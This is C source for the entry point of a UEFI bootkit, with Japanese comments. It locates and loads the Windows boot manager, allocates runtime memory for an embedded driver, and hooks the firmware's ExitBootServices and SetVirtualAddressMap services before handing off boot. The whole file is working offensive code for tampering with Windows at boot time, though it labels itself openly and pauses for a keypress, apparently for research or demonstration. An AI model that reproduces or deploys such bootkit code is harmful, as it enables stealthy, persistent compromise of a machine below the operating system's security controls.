#include "Print.h"
#include "Bootmgfw.h"
#include "Serial.h"
#include "ExitBootServices.h"
#include "SetVirtualAddressMap.h"
#include "Pe.h"
#include "BinDriver.h"

#include <efi.h>
#include <efilib.h>

extern EFI_EXIT_BOOT_SERVICES OriginalExitBootServices;
extern EFI_SET_VIRTUAL_ADDRESS_MAP OriginalSetVirtualAddressMap;

extern UINT64 PhysicalAddress;

// UEFIエントリーポイント
EFI_STATUS efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    EFI_STATUS Status;
    UINTN Event;

    EFI_DEVICE_PATH* BootmgrPath = NULL;
    EFI_HANDLE BootmgrHandle;
    INT32 ImageSize = 0;

#if defined(_GNU_EFI)
    InitializeLib(ImageHandle, SystemTable);
#endif
    do
    {
        SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

        gST->ConOut->ClearScreen(gST->ConOut);

        Print(L"\r\n%H*** UEFI bootkit ***%N\r\n\r\n");

        // bootkit.efiの情報を表示
        Status = PrintLoadedImageInfo(&ImageHandle);
        if (EFI_ERROR(Status))
        {
            Print(L"[-] Failed to PrintImageInfo(Status: %d)\r\n", Status);
        }

        // bootmgfw.efiのパスを取得
        BootmgrPath = GetWindowsBootmgrDevicePath();
        if (BootmgrPath == NULL)
        {
            Print(L"[-] Failed to find the Windows EFI bootmgr\r\n");
            Status = EFI_NOT_FOUND;
            break;
        }
        Print(L"[+] Found the Windows EFI bootmgr\r\n");

        // bootmgfw.efiをロードする
        Status = gBS->LoadImage(TRUE, ImageHandle, BootmgrPath, NULL, 0, &BootmgrHandle);
        if (EFI_ERROR(Status))
        {
            Print(L"[-] Failed to load the Windows EFI bootmgr(Status=%d)\r\n", Status);
            FreePool(BootmgrPath);
            break;
        }
        Print(L"[+] Loaded the Windows EFI bootmgr(Handle: %lx)\r\n", BootmgrHandle);

        FreePool(BootmgrPath);

        // bootmgfw.efiの情報を表示
        PrintLoadedImageInfo(&BootmgrHandle);

        // driverを書き込む領域
        ImageSize = (((GetImageSize(DriverBinary) + 0x1000 - 1) & ~(0x1000 - 1)) / 0x1000);
        Status = gBS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, ImageSize, &PhysicalAddress);
        if (EFI_ERROR(Status))
        {
            Print(L"[-] Failed to allocate pages(Status=%d)\r\n", Status);
        }
        else
        {
            Print(L"[+] Allocate pages is 0x%llx\r\n", PhysicalAddress);
        }

        // ExitBootServicesをフック
        OriginalExitBootServices = SetServicePointer((VOID**)&gBS->ExitBootServices, _ExitBootServices, TRUE);
        Print(L"[+] Original ExitBootServices is 0x%llx\n", OriginalExitBootServices);

        //SetVirtualAddressMapをフック
        OriginalSetVirtualAddressMap = SetServicePointer((VOID**)&gRT->SetVirtualAddressMap, HookedSetVirtualAddressMap, TRUE);
        Print(L"[+] Original SetVirtualAddressMap is 0x%llx\n", OriginalSetVirtualAddressMap);

        Print(L"\n%EPress any key to start winload.efi.%N\n");
        gST->ConIn->Reset(gST->ConIn, FALSE);
        gBS->WaitForEvent(1, &gST->ConIn->WaitForKey, &Event);

        // bootmgfw.efiを実行する
        Status = gBS->StartImage(BootmgrHandle, NULL, NULL);
        if (EFI_ERROR(Status))
        {
            Print(L"[-] Failed to start the Windows EFI bootmgr: %r\r\n", Status);
            gBS->UnloadImage(BootmgrHandle);
            break;
        }
        Print(L"[+] Started the Windows EFI bootmgr\r\n");

        gBS->Exit(ImageHandle, 1, 0, NULL);
    } while (FALSE);

    return EFI_SUCCESS;
}
